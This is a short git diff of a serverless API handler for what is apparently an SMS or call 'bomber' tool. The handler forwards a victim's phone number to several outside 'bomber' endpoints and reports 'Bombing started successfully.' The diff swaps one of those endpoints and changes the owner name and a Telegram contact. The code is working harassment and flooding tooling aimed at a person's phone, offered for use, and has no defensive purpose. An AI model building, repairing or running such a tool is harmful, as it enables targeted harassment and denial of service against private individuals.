@@ -18,7 +18,7 @@ export default async function handler(req, res) {
         `https://bomber-24house.vercel.app/api/bomber4?phone=${phone}`,
         `http://mrn-bio.social-networking.me/cobraCll.php?num=${phone}`,
         `https://yousuf323215.serv00.net/call90.php?number=${phone}`,
-       `https://bomber-24house.vercel.app/api/bomber5?phone=${phone}` // Added API
+       `https://bomber-24house.vercel.app/api/bomber3?phone=${phone}` // Added API
     ];
 
     let successCount = 0;
@@ -41,7 +41,7 @@ export default async function handler(req, res) {
         success: successCount,
         failed: errorCount,
         message: "Bombing started successfully.",
-        Fuck: "https://ssc-batch-2025.netlify.app/",
-        owner: "ABDULLHA"
+        Fuck: "t.me/@mahfuj5",
+        owner: "MAHFUJ"
     });
-}
+        }
